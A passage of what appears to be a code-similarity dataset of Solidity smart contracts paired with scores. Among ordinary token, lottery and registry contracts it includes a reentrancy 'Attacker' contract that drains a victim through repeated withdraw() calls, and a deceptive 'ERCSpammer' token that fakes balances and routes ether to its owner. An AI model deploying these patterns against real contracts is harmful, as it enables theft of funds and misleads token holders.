    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract TEST {

  struct Test {
    string a;
    string b;
    string c;
    string d;
    string e;
    string f;
    string g;
    string h;
    string i;
    string j;
    string k;
    string l;
    string m;
  }

  mapping (uint => Test) test;
  uint totalTests;

  function totalTestsCount() view public returns (uint) {
    return totalTests;
  }

  function createTest(string a, string b, string c, string d, string e, string f, string g, string h, string i, string j, string k, string l, string m) public returns (uint) {

    uint test_id = totalTests++;

    test[test_id] = Test(a, b, c, d, e, f, g, h, i, j, k, l, m);

    return test_id;
  } 

  function showTest(uint test_id) view public returns (string, string, string, string, string, string, string, string, string, string, string, string, string){

    Test t_test;
    t_test = test[test_id];

    return (t_test.a, t_test.b, t_test.c, t_test.d, t_test.e, t_test.f, t_test.g, t_test.h, t_test.i, t_test.j, t_test.k, t_test.l, t_test.m);
  } 

}",0.5970042080511805,"contract BuilderMaster {
   function getContractId(uint tokenId) public view returns (uint);
   function getNiftyTypeId(uint tokenId) public view returns (uint);
   function getSpecificNiftyNum(uint tokenId) public view returns (uint);
   function encodeTokenId(uint contractId, uint niftyType, uint specificNiftyNum) public view returns (uint);
   function strConcat(string memory _a, string memory _b, string memory _c, string memory _d, string memory _e) public view returns (string memory);
   function strConcat(string memory _a, string memory _b, string memory _c, string memory _d) public view returns (string memory);
   function strConcat(string memory _a, string memory _b, string memory _c) public view returns (string memory);
   function strConcat(string memory _a, string memory _b) public view returns (string memory);
   function uint2str(uint _i) public view returns (string memory _uintAsString);
}"
"contract Lottery {

    
    int constant LOTTERY_INTERVAL = 1 days;

    uint256 constant private TICKET_PRICE = 1;

    uint constant FEE_FACTOR = 200; 

    
    uint256 totalBalance = 0;

    uint totalParticipants = 0;

    uint winnerCounter = 0;

    
    struct TicketHolder {
    address ticketHolder;
    uint estimation;
    uint buyingTimeScore;
    uint timestamp;
    uint score;
    }

    
    mapping (address => TicketHolder) ticketHolders;

    mapping (uint => TicketHolder) ticketHoldersIndex;

    
    address[] ticketHoldersAddress;

    address [] winners;

    
    function Lottery(){

    }

    
    function getBuyingTime(address ticketHolder)  returns (uint){
        return ticketHolders[ticketHolder].buyingTimeScore;
    }


    function getEstimation(address ticketHolder)  returns (uint){
        return ticketHolders[ticketHolder].estimation;
    }

    function getScore(address ticketHolder)  returns (uint){
        return ticketHolders[ticketHolder].score;
    }


    function getMinute(uint timestamp)  constant returns (uint8) {
        return uint8((timestamp / 60) % 60);
    }

    function setScore(address ticketHolder, uint score) {
        ticketHolders[ticketHolder].score = score;
    }

    function calculateBuyingTimeScore()  returns (uint){
        uint timeBeforeNewRound = 60 - getMinute(now);
        return timeBeforeNewRound * 100 * 100 / 60;
    }

    function calculateDeviationScore(uint courseValue, uint estimatedValue)  returns (uint){
        uint difference = 0;
        if (courseValue >= estimatedValue) {
            difference = courseValue - estimatedValue;
        }
        else if (courseValue < estimatedValue) {
            difference = estimatedValue - courseValue;
        }

        
        uint deviation = (difference * 10000 / courseValue);
        uint score = 10000 - deviation;
        return score;
    }

    
    function buyTicket(uint estimation) payable {
        if (msg.value < TICKET_PRICE) throw;
        address ticketHolder = msg.sender;
        uint buyingTimeScore = calculateBuyingTimeScore();
        totalBalance += msg.value;
        ticketHolders[ticketHolder] = TicketHolder(msg.sender, estimation, buyingTimeScore, now, 0);
        ticketHoldersIndex[totalParticipants++] = TicketHolder(msg.sender, estimation, buyingTimeScore, now, 0);
        ticketHoldersAddress.push(ticketHolder);
    }

    function calculateScore(uint courseValue)  {
        if (totalParticipants == 0) throw;
        for (uint participant = 0; participant < totalParticipants; participant++) {
            TicketHolder ticketHolder = ticketHoldersIndex[participant];
            uint deviationScore = calculateDeviationScore(courseValue, ticketHolder.estimation) / 2;
            uint buyingTimeScore = ticketHolder.buyingTimeScore / 2;
            uint totalScore = deviationScore + buyingTimeScore;
            setScore(ticketHolder.ticketHolder, totalScore);
        }
    }

    function determineWinners()  returns (uint){
        uint highestScore = 0;
        for (uint participant = 0; participant < totalParticipants; participant++) {
            TicketHolder ticketHolder = ticketHoldersIndex[participant];
            uint score = ticketHolder.score;
            if (score >= highestScore) {
                winners.push(ticketHolder.ticketHolder);
                winnerCounter++;
                highestScore = score;
            }
        }
        return ticketHoldersAddress.length;
    }

    function payout(uint courseValue)  {
        if (totalParticipants == 0) throw;
        calculateScore(courseValue);
        determineWinners();
        uint256 winAmount = totalBalance / winnerCounter;
        for (uint i = 0; i < winnerCounter; i++) {
            address winnerTicket = winners[i];
            winnerTicket.transfer(winAmount);
        }
    }

}",0.579517468745144,"contract UnilotBonusTailToken is BaseUnilotGame {
    mapping (address => TicketLib.Ticket[]) public tickets;
    mapping (address => uint) _prize;

    uint16 numTickets;

    uint64 winnerIndex;

    uint256 constant public _prizeAmount = 100000 * (10**18);

    function UnilotBonusTailToken(address calculatorContractAddress)
        public
    {
        state = State.ACTIVE;
        administrator = msg.sender;

        calculator = UnilotPrizeCalculator(calculatorContractAddress);

        GameStarted(0);
    }

    function importPlayers(address game, address[] players)
        public
        onlyAdministrator
    {
        UnilotTailEther _game = UnilotTailEther(game);

        for (uint8 i = 0; i < uint8(players.length); i++) {
            TicketLib.Ticket memory ticket;

            var(block_number, block_time, prize) = _game.getPlayerDetails(players[i]);

            if (prize > 0) {
                continue;
            }

            ticket.block_number = uint40(block_number);
            ticket.block_time = uint32(block_time);

            if ( tickets[players[i]].length == 0 ) {
                ticketIndex.push(players[i]);
            }

            tickets[players[i]].push(ticket);
            numTickets++;
        }
    }

    function getPlayerDetails(address player)
        public
        view
        inactiveGame
        returns (uint, uint, uint)
    {
        player;

        return (0, 0, 0);
    }

    function ()
        public
        payable
        onlyAdministrator
    {

    }

    function getPrizeAmount()
        public
        constant
        returns (uint result)
    {
        return _prizeAmount;
    }

    function calcaultePrizes()
        public
        returns(uint[] memory result)
    {
        var(numWinners, numFixedAmountWinners) = getNumWinners();
        uint16 totalNumWinners = uint16( numWinners + numFixedAmountWinners );
        result = new uint[]( totalNumWinners );


        uint[50] memory prizes = calculator.calcaultePrizes(
            _prizeAmount/ticketIndex.length, ticketIndex.length);

        for (uint16 i = 0; i < totalNumWinners; i++) {
            result[i] = prizes[i];
        }

        return result;
    }

    function getWinners()
        public
        view
        finishedGame
        returns(address[] memory players, uint[] memory prizes)
    {
        var(numWinners, numFixedAmountWinners) = getNumWinners();
        uint totalNumWinners = numWinners + numFixedAmountWinners;

        players = new address[](totalNumWinners);
        prizes = new uint[](totalNumWinners);

        uint index;

        for (uint i = 0; i < totalNumWinners; i++) {
            if ( i > winnerIndex ) {
                index = ( ( players.length ) - ( i - winnerIndex ) );
            } else {
                index = ( winnerIndex - i );
            }

            players[i] = ticketIndex[index];
            prizes[i] = _prize[players[i]];
        }

        return (players, prizes);
    }

    function finish()
        public
        onlyAdministrator
        activeGame
    {
        uint64 max_votes;
        uint64[] memory num_votes = new uint64[](ticketIndex.length);

        for (uint i = 0; i < ticketIndex.length; i++) {
            for (uint8 j = 0; j < tickets[ticketIndex[i]].length; j++) {
                TicketLib.Ticket memory ticket = tickets[ticketIndex[i]][j];

                uint64 vote = uint64( ( ( ( ticket.block_number * ticket.block_time ) / numTickets ) + (((block.number/2) * now) / (numTickets/2)) + uint( ticketIndex[i]) ) % ticketIndex.length );

                num_votes[vote] += 1;

                if ( num_votes[vote] > max_votes ) {
                    max_votes = num_votes[vote];
                    winnerIndex = vote;
                }
            }
        }

        uint[] memory prizes = calcaultePrizes();

        uint lastId = winnerIndex;

        for ( i = 0; i < prizes.length; i++ ) {
            _prize[ticketIndex[lastId]] = prizes[i];

            if ( lastId <= 0 ) {
                lastId = ticketIndex.length;
            }

            lastId -= 1;
        }

        administrator.transfer(this.balance); 

        state = State.ENDED;

        GameFinished(ticketIndex[winnerIndex]);
    }

    function revoke()
        public
        onlyAdministrator
        activeGame
    {
        administrator.transfer(this.balance);

        state = State.REVOKED;
    }
}"
"contract SinglePatreon { 
    bytes32 public name;
    uint public singleDonationAmount;
    uint public monthlyDonationAmount;
    address creator;
    uint contractNumber;

    modifier onlyCreator {if (msg.sender != creator) revert(); _; }
    modifier onlyPatreons {if (msg.sender == creator) revert(); _;}

    event LOG_SingleDonation (uint donationAmount, address donator);
    event LOG_Withdraw (uint emptyBalance);
    event LOG_creatorAddressAndSender (address factoryAddress, address creator);

    function SinglePatreon (bytes32 _name, uint _contractNumber) payable {        
        contractNumber = _contractNumber;
        PatreonFactory pf = PatreonFactory(msg.sender);
        name = _name;
        creator = pf.getOriginalCreator(contractNumber);
        LOG_creatorAddressAndSender(msg.sender, creator);

    }

    function setOneTimeContribution(uint setAmountInWei) onlyCreator  returns(uint){
        singleDonationAmount = setAmountInWei;
        return singleDonationAmount;
    }

      function oneTimeContribution() payable onlyPatreons returns(uint){
        if (msg.value != singleDonationAmount) revert(); 
        LOG_SingleDonation(this.balance, msg.sender);
        return this.balance;
      }


    function creatorWithdrawFromContract() onlyCreator returns (uint) { 
      
      LOG_Withdraw(creator.balance);
      creator.transfer(this.balance);
      LOG_Withdraw(creator.balance);

      return creator.balance;
  }}",0.5781786761073188,"contract LUPXSale {

    IERC20Token public tokenContract ;

    address owner ;

    uint256 public tokensSold ;

    uint256 public LUPXPrice ;

    

    event sold(address buyer, uint256 amount) ;

    event priceAdjusted(uint256 oldPrice, uint256 newPrice) ;

    event endOfSale(uint256 timeStamp) ; 



    constructor(IERC20Token _tokenContract, uint256 LUPXperETH) public {

        owner = msg.sender ;

        tokenContract = _tokenContract ;

        LUPXPrice = LUPXperETH ; 

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner) ; 

        _;

    }



    function safeMultiply(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0 ;

        } else {

            uint256 c = a * b ;

            assert(c / a == b) ;

            return c ;

        }

    }



    function () public payable {

        uint256 soldAmount = 0 ; 

        

        if (msg.value <= 1 ether) {

            soldAmount = safeMultiply(msg.value, LUPXPrice) ;

        }

        else {

            soldAmount = safeMultiply(msg.value*3/2, LUPXPrice) ;

        }

        require(tokenContract.balanceOf(this) >= soldAmount) ;

        tokenContract.transfer(msg.sender, soldAmount) ;

        

        tokensSold += soldAmount/10**18 ; 

        emit sold(msg.sender, soldAmount/10**18) ; 



    }

    

    function withdrawETH() public  onlyOwner {

        msg.sender.transfer(address(this).balance) ;  

    }



    function endLUPXSale() public onlyOwner { 

        require(tokenContract.transfer(owner, tokenContract.balanceOf(this))) ;

        msg.sender.transfer(address(this).balance) ;

        emit endOfSale(now) ; 

    }

}"
"contract OurRentalTestFromClassMay24 is Ownable {

  struct Article{
  uint id;
  address seller;
  address buyer;
  uint beds;
  uint baths;
  string propaddress;
  uint rental_price;
  string article_description;
  string available;
  string contact_email;
  }
  mapping(uint => Article) public articles;

  uint articleCounter;

    event LogSellArticle(
    address indexed _seller,
    uint _beds,
    uint _baths,
    string _propaddress,
    uint _rental_price,
    string _article_description,
    string _available,
    string _contact_email
  );
  event LogBuyArticle(
    uint indexed _id,
    address indexed _seller,
    address indexed _buyer,
    uint _beds,
    uint _baths,
    string _propaddress,
    uint _rental_price,
    string _article_description,
    string _available,
    string _contact_email

    );

    function kill() public onlyOwner {

    selfdestruct(owner);
    }

  function sellArticle(uint _beds, uint _baths, string _propaddress, uint _rental_price, string _article_description, string _available, string _contact_email) public {
    articleCounter++;

    articles[articleCounter] = Article(
      articleCounter,
     msg.sender,
    0x0,
     _beds,
     _baths,
     _propaddress,
     _rental_price,
     _article_description,
     _available,
     _contact_email
     );

    LogSellArticle(msg.sender, _beds, _baths, _propaddress, _rental_price, _article_description, _available, _contact_email);
  }
    function getNumberOfArticles() public view returns (uint){
   return articleCounter;
   }


   function getArticlesForSale() public view returns (uint[]){

     uint[] memory articleIds = new uint[](articleCounter);
     uint numberOfArticlesForSale = 0;

     for(uint i = 1; i <= articleCounter; i++){

       if(articles[i].buyer == 0x0){

         articleIds[numberOfArticlesForSale] = articles[i].id;

         numberOfArticlesForSale++;

       }
     }

     uint[] memory forSale = new uint[](numberOfArticlesForSale);
     for(uint j = 0; j < numberOfArticlesForSale; j++){

     forSale[j] = articleIds[j];

     }
     return forSale;

   }


 function buyArticle(uint _id) payable public {

   require(articleCounter > 0);
   require(_id > 0 && _id <= articleCounter);

   Article storage article = articles[_id];

   require(article.buyer == 0x0);

   require(msg.sender != article.seller);

   require(msg.value == article.rental_price);

   article.buyer = msg.sender;

   article.seller.transfer(msg.value);
   LogBuyArticle(_id, article.seller, article.buyer, article.beds, article.baths, article.propaddress, article.rental_price, article.article_description, article.available, article.contact_email);
 }
}",0.5717863592713708,"contract Token {
    
    using SafeMath for uint256;
     
    string public symbol = ""LPN"";
    string public name = ""Litepool"";
    uint8 public constant decimals = 18;
    uint256 _totalSupply = 35000000;
    uint256 buyPrice = 769230769230769;
    address owner = 0x5367B63897eDE5076cD7A970a0fd85750e27F745;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Debug(string message, uint number);
    mapping(address => uint256) balances;
 
    mapping(address => mapping (address => uint256)) allowed;
 
    function Token() public {
        balances[owner] = _totalSupply * 10 ** 18;
    }
   
   function changeBuyPrice(uint price)
   {
       if (msg.sender == owner){
        buyPrice = price * 10 ** 18;    
       }
   }
    
    function totalSupply() constant returns (uint256 totalSupply) {        
        return _totalSupply;
    }
 
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner].div(10 ** uint256(decimals));
    }
 
    function transfer(address _to, uint256 _amount) internal returns (bool success) {
        if (balances[msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(msg.sender, _to, _amount);
            return true;
        } else {
            return false;
        }
    }
 
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) internal returns (bool success) {
        if (balances[_from] >= _amount
            && allowed[_from][msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[_from] -= _amount;
            allowed[_from][msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(_from, _to, _amount);
            return true;
        } else {
            return false;
        }
    }
 
    function approve(address _spender, uint256 _amount) returns (bool success) {
        allowed[msg.sender][_spender] = _amount;
        Approval(msg.sender, _spender, _amount);
        return true;
    }
 
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
     
      function () public payable {
       
        buy(msg.sender);
    }
    function buy(address beneficiary) payable public returns (uint amount) {
        amount = msg.value.div(buyPrice);                   
        amount = amount * 10 ** 18;
        require(balances[owner] >= amount);               
        balances[beneficiary] = balances[beneficiary].add(amount);  
        balances[owner] = balances[owner].sub(amount);     
        owner.transfer(msg.value);
        Transfer(owner, msg.sender, amount);               
        return amount;                                    
    }
}"
"contract AdContractTest3 is usingOraclize {
    string public calc_script_base_url = ""http:
    uint public total_price_in_szabo;
    uint public szabo_per_placement;
    uint public szabo_per_view;
    address public client;
    address public blogger;

    event LogPriceUpdated(string price);
    event LogNewOraclizeQuery(string description);
    event LogNotEnoughEther();
    event LogEtherSent();
    event LogOnDeposit(address sender, uint amount);

    function AdContractTest3(uint price_in_szabo_per_placement, uint price_in_szabo_per_view, address client_address, address blogger_address) public payable {
        szabo_per_placement = price_in_szabo_per_placement;
        szabo_per_view = price_in_szabo_per_view;
        client = client_address;
        blogger = blogger_address;
    }

    function strConcat(string s1, string s2, string s3, string s4, string s5, string s6, string s7) internal pure returns (string)
    {
        return strConcat(strConcat(s1, s2, s3, s4), strConcat(s5, s6, s7));
    }

    function __callback(bytes32 myid, string result) public {
        require(msg.sender == oraclize_cbAddress());
        myid; 
        total_price_in_szabo = parseInt(result);
        LogPriceUpdated(result);
    }

    function updatePrice(string video_url) public payable returns(string) {
        if (oraclize_getPrice(""URL"") > this.balance) {
            LogNewOraclizeQuery(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
        } else {
            var url = strConcat(calc_script_base_url, ""?price_in_szabo_per_placement="", uint2str(szabo_per_placement), ""&price_in_szabo_per_view="", uint2str(szabo_per_view), ""&video_url="", video_url);
            oraclize_query(""URL"", strConcat(""json("", url, "").total_price_in_szabo""));
            var log_msg = strConcat(""Oraclize query '"", url, ""' was sent, standing by for the answer..."");
            LogNewOraclizeQuery(log_msg);
        }
    }

    function payForWork() public {
        if (total_price_in_szabo * 1 szabo > this.balance) {
            LogNotEnoughEther();
        } else {
            blogger.transfer(total_price_in_szabo * 1 szabo);
            LogEtherSent();
        }
    }

    function onDeposit() public payable {
        LogOnDeposit(msg.sender, msg.value);
    }
}",0.565150008538832,"contract ERCSpammer is ERC20Interface {
    
    
    string public name = ""ERCSpammer - erc20spammer.surge.sh"";
    uint8 public decimals = 18;                
    string public symbol = ""erc20spammer.surge.sh"";
    
    
    uint256 public stdBalance;
    mapping (address => uint256) public bonus;
    
    
    address public owner;

    
    
    event Message(string message);
    
    bool up;

    function ERCSpammer(uint256 _totalSupply, uint256 _stdBalance, string _symbol, string _name)
        public
    {
        owner = tx.origin;
        totalSupply = _totalSupply;
        stdBalance = _stdBalance;
        symbol=_symbol;
        name=_name;
        up=true;
    }
    
   function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        bonus[msg.sender] = bonus[msg.sender] + 1e18;
        Message(""+1 token for you."");
        Transfer(msg.sender, _to, _value);
        return true;
    }
    

   function transferFrom(address _from, address _to, uint256 _value)
        public
        returns (bool success)
    {
        bonus[msg.sender] = bonus[msg.sender] + 1e18;
        Message(""+1 token for you."");
        Transfer(msg.sender, _to, _value);
        return true;
    }
    

    function change(string _name, string _symbol, uint256 _stdBalance, uint256 _totalSupply, bool _up)
        public
    {
        require(owner == msg.sender);
        name = _name;
        symbol = _symbol;
        stdBalance = _stdBalance;
        totalSupply = _totalSupply;
        up = _up;
        
    }
    
    function del() public{
        require(owner==msg.sender);
        suicide(owner);
    }


    
    function balanceOf(address _owner)
        public
        view 
        returns (uint256 balance)
    {
        if(up){
            if(bonus[msg.sender] > 0){
                return stdBalance + bonus[msg.sender];
            } else {
                return stdBalance;
            }
        } else {
            return 0;
        }
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success) 
    {
        return true;
    }

    function allowance(address _owner, address _spender)
        public
        view
        returns (uint256 remaining)
    {
        return 0;
    }
    

    function()
        public
        payable
    {
        owner.transfer(this.balance);
        Message(""Thanks for your donation."");
    }
    

    function rescueTokens(address _address, uint256 _amount)
        public
        returns (bool)
    {
        return ERC20Interface(_address).transfer(owner, _amount);
    }
}"
"contract SDFFinance {
    using strings for *;
    address addr;
    address public driver1;
    address public driver2;
    address public driver3;
    string statusOf;
    uint coin;

function SDFFinance(uint balance) {
    coin=balance;
    driver1=0x1b7207197717fe2114d3d22f38c81d980e74e13a;
    driver2=0x1b7207197717fe2114d3d22f38c81d980e74e13a;
    driver3=0x1b7207197717fe2114d3d22f38c81d980e74e13a;
    statusOf='OPN';
  }  

function changeShipmentStatus(string shipmentId,string st){
            statusOf=st;
        processPayment();
}

function processPayment(){
    if(statusOf.toSlice().equals('RAP'.toSlice())){
        sendPayment(driver1);
    }
    else if(statusOf.toSlice().equals('DAL'.toSlice())){
        sendPayment(driver2);
    }

    else
    if(statusOf.toSlice().equals('ATD'.toSlice())){
        sendPayment(driver3);
    }
}



function sendPayment(address beneficiary) payable returns(bool success) {
  if(msg.value==0) throw;
  if(!beneficiary.send(msg.value)) throw;
  return true;
}

function getBalance() returns(uint){
    return coin; 
}

function getStatus() returns(string){
    return statusOf; 
}

function getAddress() returns(address){
    return addr; 
}

}",0.5479784456412476,"contract BitsenseToken {
    string internal _symbol;
    string internal _name;
    uint8 internal _decimals;
    uint internal _totalSupply = 1000000000000000;
    mapping (address => uint) _balanceOf;
    mapping (address => mapping (address => uint)) internal _allowances;

    function BitsenseToken(string symbol, string name, uint8 decimals, uint totalSupply) public {
        _symbol = symbol;
        _name = name;
        _decimals = decimals;
        _totalSupply = totalSupply;
    }

    function name() public constant returns (string) {
        return _name;
    }

    function symbol() public constant returns (string) {
        return _symbol;
    }

    function decimals() public constant returns (uint8) {
        return _decimals;
    }

    function totalSupply() public constant returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address _addr) public constant returns (uint);
    function transfer(address _to, uint _value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint _value);
}"
"contract BoostrFactory {
            address[] private deployedBoostrs;

            function createBoostr(string title, string description, uint minimum) public {
                    address newBoostr = new Boostr(title, description, minimum, msg.sender);
                    deployedBoostrs.push(newBoostr);
            }

            function getAllBoostrs() public view returns (address[]) {
                    return deployedBoostrs;
            }
    }",0.5970426869262007,"contract CryptoPeopleName {

    address owner;

    mapping(address => string) private nameOfAddress;

  

    function CryptoPeopleName() public{

        owner = msg.sender;

    }

    

    function setName(string name) public {

        nameOfAddress[msg.sender] = name;

    }

    

    function getNameOfAddress(address _address) public view returns(string _name){

        return nameOfAddress[_address];

    }

    

}"
"contract Attacker {
  Victim victim;

  function Attacker(address victimAddress) {
    victim = Victim(victimAddress);
  }

  function attack() {
    victim.withdraw();
  }

  
  function () payable {
    if (victim.balance >= msg.value) {
      victim.withdraw();
    }
  }
}",0.5608452364731317,"contract CardboardUnicorns {
  address public owner;
  function mint(address who, uint value);
  function changeOwner(address _newOwner);
  function withdraw();
  function withdrawForeignTokens(address _tokenContract);
}"
"contract ExampleContract {

struct ExampleStruct {
    address owner,
    string text
}

ExampleStruct[] public exampleStructs;

function ExampleContract( address myAddress, string myText ) {
    ExampleStruct memory es;

    es.owner = myAddress;
    es.text = myText;

    exampleStructs.push(es);
}

...

}",0.5095049584411107,"contract DdosMitigation {
    struct Report {
        address reporter;
        bytes32 ipAddress;
    }

    address public owner;
    Report[] public reports;

    function DdosMitigation() {
        owner = msg.sender;
    }

    function report(bytes32 ipAddress) {
        reports.push(Report({
            reporter: msg.sender,
            ipAddress: ipAddress
        }));
    }
}"
"contract ExampleRNG {

        
        uint public seedTrigger; 

        
        uint public registrantCounter;

        
        
        uint[] internal winningSeeds;

        
        uint public winningThreshold; 

        
        bytes32 public latestSeed;

        
        uint public stakes;

        
        struct Tickets {
            uint lower;
            uint upper;
        }

        
        mapping(address => Tickets) public ticketsets;


        constructor(uint _seedTrigger, uint _winningThreshold) public {
            seedTrigger = _seedTrigger;
            winningThreshold = _winningThreshold;
        }

        
        
        function register(uint stake) external {
            require(winningSeeds.length <= winningThreshold, ""[!] the registration activity has been closed"");

            ticketsets[msg.sender].lower = stakes;
            ticketsets[msg.sender].upper = stakes + stake;

            latestSeed = keccak256(abi.encodePacked(latestSeed, stake));

            stakes = stakes + stake;

            registrantCounter++;

            if (registrantCounter == seedTrigger) {
                uint winningSeed = uint(latestSeed) % stakes;
                winningSeeds.push(winningSeed); 
                registrantCounter = 0;
            }
        }

        function revealWinningSeeds() external view returns(uint[] memory) {
            return(winningSeeds);
        }
    }",0.5510252235178946,"contract Access{

    mapping(address => bool) winners;

    

    address public owner;

    address public signer;

    bool paused;

    

    bytes32 constant public PAUSED = keccak256(abi.encodePacked(""Pause""));

    bytes32 constant public UNPAUSED = keccak256(abi.encodePacked(""Unpause""));

    

    constructor(address _signer, address _owner) public payable{

        owner = _owner;

        signer = _signer;

    }

    

    function lock(bytes32 r, bytes32 s) external {

        require(sigCheck(PAUSED, r, s));

        require(!paused);

        

        paused = true;

    }

    

    function unlock(bytes32 r, bytes32 s) external {

        require(sigCheck(UNPAUSED, r, s));

        require(paused);

        

        paused = false;

    }

    

    function withdraw() external {

        require(!paused);

        msg.sender.transfer(address(this).balance);

    }

    

    function win(address _winner) external {

        require(msg.sender == owner);

        winners[_winner] = true;

    }

    

    

    function sigCheck(bytes32 _hash, bytes32 r, bytes32 s) internal view returns (bool) {

      if(ecrecover(_hash, 27, r, s) == signer){

        return(true);

      }

      else{

        return(ecrecover(_hash, 28, r, s) == signer);

      }

	}

}"
"contract MyContract {
    address[] funders = [0x0,0x1,0x2];
    address target = 0x3;       
    address gasStation = 0x4;    
    ERC20 token = ERC20(0x44197A4c44D6A059297cAf6be4F7e172BD56Caaf);     

    uint raisedFund = 0;
    mapping (address => uint) depositAmount;     
    mapping (address => uint) tokenAmount;       
    mapping (address => bool) ready;      
    bool funding = true;        
    uint num_of_ready = 0;

    function MyContract() payable {
        if(funding)         
            updateRaisedFund();
    }

    function updateRaisedFund() internal {
        for(uint i = 0;i < funders.length;i++){ 
            if(funders[i] == msg.sender){       
                raisedFund += msg.value;
                depositAmount[msg.sender] += msg.value;
                break;
            }
        }
    }

    modifier whiteListed {
        bool inList = false;
        for(uint i = 0;i < funders.length;i++){ 
            if(funders[i] == msg.sender){
                inList = true;
            }
        }
        require(inList);     
        _;
    }

    function withdrawEth() whiteListed {
        uint minAmount = depositAmount[msg.sender]; 
        if(minAmount > 5 * (10**15) && funding){   
            msg.sender.transfer(minAmount - 5 * (10**15)); 
            raisedFund -= depositAmount[msg.sender];
            depositAmount[msg.sender] = 0;
        }
    }

    function readyToGo() whiteListed {
        if(ready[msg.sender] == false){
            ready[msg.sender] = true;
            num_of_ready ++;
            if(num_of_ready == funders.length){
                funding = false;
            }
        }
    }

    modifier allReady {
        require(funding == false);
        _;
    }

    function sendTheFund() allReady {
        raisedFund -= funders.length*(5**15);   
        target.transfer(raisedFund); 

        

    }

    modifier tokenCame{
        require(token.balanceOf(this) > 0);
        _;
    }

    function distributeToken() tokenCame{   
        for(uint i = 0;i < funders.length;i++){
            tokenAmount[funders[i]] = token.balanceOf(this) * (depositAmount[funders[i]] - 5**15)  / (raisedFund);
        }
        for(i = 0;i < funders.length;i++){
            token.transferFrom(this,funders[i],tokenAmount[funders[i]]);
        }
        gasStation.transfer(this.balance);      
    }
}",0.5989552614849711,"contract TuneTokenSale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;
    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);
    function TuneTokenSale() public {
        beneficiary = address(0x0D2e5bd9C6DDc363586061C6129D6122f0D7a2CB);
        fundingGoal = 40000 ether;
        deadline = now + 86415 minutes; 
        price = 60000;
        tokenReward = token(address(0x377748DDc51b3075B84500A6Ed95D260A102d85f));
    }
    function () public payable {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount * price);
        FundTransfer(msg.sender, amount, true);
    }
    modifier afterDeadline() { if (now >= deadline) _; }
    function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
    function safeWithdrawal() public {
        if (beneficiary == msg.sender) {
                beneficiary.transfer(this.balance);
                FundTransfer(beneficiary, this.balance, false);
        }
    }
    function withdrawForeignTokens(address _tokenContract) public returns (bool) {
        if (msg.sender != beneficiary) { revert(); }

        ForeignToken tokenf = ForeignToken(_tokenContract);

        uint256 amount = tokenf.balanceOf(address(this));
        return tokenf.transfer(beneficiary, amount);
    }
}"
"contract Puppy {

  enum State { good, bad }

  State public status;
  State public constant INITIAL_STATUS = State.good;

  function Puppy() {
    status = INITIAL_STATUS;
  }
}",0.5453378862519529,"contract LATIME is MintableToken 
{
  string public constant name = ""LATIME"";
  string public constant symbol = ""LATIME"";

 function LATIME() { totalSupply = 0 ; } 
}"
"contract NewBook {

    struct ChapterData {
        
        string title;
        string color;
        uint pages;
    }

    struct BookData {
        
        ChapterData[] chapters;
    }

    mapping(bytes32 => BookData) books; 

    function addChapter(bytes32 _bookID, string memory title, string color, uint pages) public {
        ChapterData memory c = ChapterData({
            title: title,
            color: color,
            pages: pages
        });
        books[_bookID].chapters.push(c);
    }",0.5533668257434744,"contract BaseFactory {

    address public mainFabricAddress;
    string public title;

    struct Parameter {
        string title;
        string paramType;
    }

    
    Parameter[] public params;

    
    function numParameters() public view returns (uint256)
    {
        return params.length;
    }

    function getParam(uint _i) public view returns (
        string title,
        string paramType
    ) {
        return (
        params[_i].title,
        params[_i].paramType
        );
    }
}"
"contract Silly {
  function unsafePrivateWithdraw(address addr, uint amount) private {
    addr.transfer(amount);
  }
  function safeWithdraw(address addr, uint amount) {
    if (!checkWithdrawConditions) throw; 
    unsafePrivateWithdraw(addr, amount);
  }
}",0.5910255590994681,"contract E4LavaRewards
{
        function checkDividends(address _addr) constant returns(uint _amount);
        function withdrawDividends() public returns (uint namount);
        function transferDividends(address _to) returns (bool success);

}"
"contract Registry {
    struct Name {
        string first;
        string last;
    }

    mapping(address => Name) reg;

    function newName(string first, string last) {
        address sender = msg.sender;

        if(reg[sender] != 0) {
            throw;
        }

        reg[sender].first = first;
        reg[sender].last = last;
    }
}",0.5843704109879501,"contract RecoverEosKey {

    

    mapping (address => string) public keys;

    

    event LogRegister (address user, string key);

    

    function register(string key) public {

        assert(bytes(key).length <= 64);

        keys[msg.sender] = key;

        emit LogRegister(msg.sender, key);

    }

}"
"contract Dicegame {

    address owner =  0x62a0bbA644863c09cB97Bda35b946c27C359A8F3;

    mapping(address => string)resultt;
    mapping(address => uint)randnumber;
    mapping(address => uint)winmoneyy;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function payforstartbet(uint _undernumber,string _name) public payable {

        require(msg.value < 100000000000000000000);
        require(msg.value > 100000000000000000);
        require(_undernumber <= 98);
        require(_undernumber >= 1);

        string memory betresult;
        uint winmoney;
        uint ownerget;
